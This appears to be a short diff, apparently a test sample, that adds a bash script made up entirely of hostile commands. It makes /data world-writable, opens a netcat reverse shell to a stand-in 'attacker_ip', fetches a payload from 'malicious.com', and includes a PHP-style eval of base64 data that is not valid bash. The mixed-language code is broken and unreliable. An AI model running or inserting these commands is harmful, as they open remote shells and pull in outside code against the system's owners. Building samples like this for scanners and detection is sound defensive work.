@@ -1,0 +1,5 @@
+#!/bin/bash
+chmod 777 /data
+eval(base64_decode('malicious'))
+nc -e /bin/bash attacker_ip 4444
+curl http://malicious.com/payload.sh
